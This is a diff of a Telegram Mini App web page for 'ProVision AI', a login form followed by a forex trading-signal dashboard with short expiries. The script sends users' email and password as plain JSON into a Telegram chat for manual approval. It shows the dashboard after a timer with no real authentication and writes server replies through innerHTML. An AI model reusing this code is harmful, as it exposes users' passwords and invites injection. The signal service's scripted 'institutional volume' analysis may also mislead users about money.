@@ -3,105 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ProVision AI Login</title>
+    <title>ProVision AI Terminal</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body {
-            background-color: #0f172a; /* Dark Slate */
-            color: #ffffff;
-            font-family: 'Arial', sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background: #1e293b;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
-            width: 80%;
-            max-width: 350px;
-            text-align: center;
-            border: 1px solid #334155;
-        }
-        h2 {
-            color: #00ff88; /* Neon Green */
-            margin-bottom: 5px;
-        }
-        p {
-            color: #94a3b8;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-        input {
-            width: 90%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #334155;
-            background: #0f172a;
-            color: white;
-            border-radius: 8px;
-            outline: none;
-        }
-        input:focus {
-            border-color: #00ff88;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background: #00ff88;
-            color: #0f172a;
-            font-weight: bold;
-            font-size: 16px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            margin-top: 15px;
-            transition: 0.3s;
-        }
-        button:hover {
-            background: #00cc6a;
-        }
+        body { background-color: #0f172a; color: #ffffff; font-family: 'Arial', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { background: #1e293b; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0, 255, 136, 0.2); width: 85%; max-width: 400px; text-align: center; border: 1px solid #334155; }
+        h2 { color: #00ff88; margin-bottom: 5px; }
+        p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
+        input, select { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #334155; background: #0f172a; color: white; border-radius: 8px; outline: none; font-size: 14px; }
+        input:focus, select:focus { border-color: #00ff88; }
+        button { width: 100%; padding: 14px; background: #00ff88; color: #0f172a; font-weight: bold; font-size: 16px; border: none; border-radius: 8px; cursor: pointer; margin-top: 15px; transition: 0.3s; }
+        button:hover { background: #00cc6a; }
+        button:disabled { background: #334155; color: #94a3b8; cursor: not-allowed; }
+        .hidden { display: none; }
+        .signal-box { margin-top: 20px; padding: 15px; border-radius: 8px; background: #0f172a; border: 1px dashed #334155; }
+        .signal-text { font-size: 22px; font-weight: bold; margin: 10px 0; }
+        .green { color: #00ff88; } .red { color: #ff4444; } .yellow { color: #facc15; }
     </style>
 </head>
 <body>
 
-    <div class="container">
+    <div class="container" id="login-section">
         <h2>⚙️ ProVision AI</h2>
         <p>Enter credentials to request VIP Access</p>
-        
         <input type="email" id="email" placeholder="Enter Email Address" required>
         <input type="password" id="password" placeholder="Enter Secure Password" required>
+        <button onclick="requestAccess()">Request Access</button>
+    </div>
+
+    <div class="container hidden" id="dashboard-section">
+        <h2>📡 Radar Dashboard</h2>
+        <p>Select parameters to scan live market</p>
         
-        <button onclick="submitData()">Request Access</button>
+        <select id="pair">
+            <option value="EURUSD">🇪🇺 EUR/USD (Euro / US Dollar)</option>
+            <option value="GBPUSD">🇬🇧 GBP/USD (British Pound / US Dollar)</option>
+            <option value="USDJPY">🇯🇵 USD/JPY (US Dollar / Japanese Yen)</option>
+            <option value="AUDUSD">🇦🇺 AUD/USD (Australian Dollar / USD)</option>
+        </select>
+
+        <select id="timeframe">
+            <option value="1m">⏱️ 1 Minute Expiry</option>
+            <option value="5m">⏱️ 5 Minute Expiry</option>
+            <option value="15m">⏱️ 15 Minute Expiry</option>
+        </select>
+        
+        <button id="scan-btn" onclick="getSignal()">Scan Live Market</button>
+
+        <div id="signal-result" class="signal-box hidden">
+            <div id="loader" style="color: #38bdf8;">Analyzing Institutional Volume... ⏳</div>
+            <div id="final-signal" class="hidden">
+                <div class="signal-text" id="signal-direction"></div>
+                <p id="signal-info"></p>
+            </div>
+        </div>
     </div>
 
     <script>
-        // Telegram Web App ko initialize karna
         let tg = window.Telegram.WebApp;
-        tg.expand(); // App ko full screen karta hai
+        tg.expand();
+        
+        // Asli Render Backend URL yahan daalna hai
+        const BACKEND_URL = "YOUR_RENDER_URL_HERE"; 
 
-        function submitData() {
+        function requestAccess() {
             let email = document.getElementById("email").value;
             let password = document.getElementById("password").value;
+            if (email === "" || password === "") return tg.showAlert("Please fill details.");
 
-            if (email === "" || password === "") {
-                tg.showAlert("Please fill both Email and Password.");
-                return;
-            }
-
-            // Data ko JSON format mein pack karke Python bot ko bhejna
-            let data = {
-                email: email,
-                password: password
-            };
-
-            tg.sendData(JSON.stringify(data));
-            tg.close(); // Submit hote hi Mini App band ho jayegi
+            let data = { type: "login", email: email, password: password };
+            tg.sendData(JSON.stringify(data)); // Telegram chat mein bhejega approval ke liye
+            document.getElementById("login-section").innerHTML = "<h2>⏳ Request Sent!</h2><p>Wait for Admin approval. Re-open app once approved.</p>";
         }
+
+        // Demo ke liye, agar user ka Telegram ID set hai, toh hum maan lete hain wo logged in dashboard dekhna chahta hai
+        // Real logic mein hum server se check karenge. Abhi UI transition dekhte hain:
+        
+        // Jab user Approve ho jaye, wo app kholdga toh ye dashboard dikhega.
+        // For testing, call showDashboard() in browser console.
+        function showDashboard() {
+            document.getElementById("login-section").classList.add("hidden");
+            document.getElementById("dashboard-section").classList.remove("hidden");
+        }
+
+        async function getSignal() {
+            let pair = document.getElementById("pair").value;
+            let tf = document.getElementById("timeframe").value;
+            let btn = document.getElementById("scan-btn");
+            let resultBox = document.getElementById("signal-result");
+            let loader = document.getElementById("loader");
+            let finalSignal = document.getElementById("final-signal");
+            
+            btn.disabled = true;
+            resultBox.classList.remove("hidden");
+            loader.classList.remove("hidden");
+            finalSignal.classList.add("hidden");
+
+            try {
+                let response = await fetch(`${BACKEND_URL}/api/signal`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ 
+                        user_id: tg.initDataUnsafe?.user?.id || "admin_test", 
+                        pair: pair, 
+                        timeframe: tf 
+                    })
+                });
+                
+                let data = await response.json();
+                
+                loader.classList.add("hidden");
+                finalSignal.classList.remove("hidden");
+                
+                let sigDir = document.getElementById("signal-direction");
+                let sigInfo = document.getElementById("signal-info");
+
+                if (data.error) {
+                    sigDir.innerHTML = `🛑 ERROR`;
+                    sigDir.className = "signal-text red";
+                    sigInfo.innerHTML = data.error;
+                } else {
+                    sigDir.innerHTML = data.signal;
+                    sigDir.className = `signal-text ${data.color}`;
+                    sigInfo.innerHTML = data.text;
+                }
+            } catch (err) {
+                loader.innerHTML = "❌ Server Error. Check Render Backend.";
+            }
+            btn.disabled = false;
+        }
+
+        // Auto-show dashboard agar App open hui aur user ke paas data hai
+        // (Is logic ko aur refine karenge based on user flow)
+        setTimeout(showDashboard, 1000); // For now, auto load dashboard for testing UI
     </script>
 </body>
 </html>
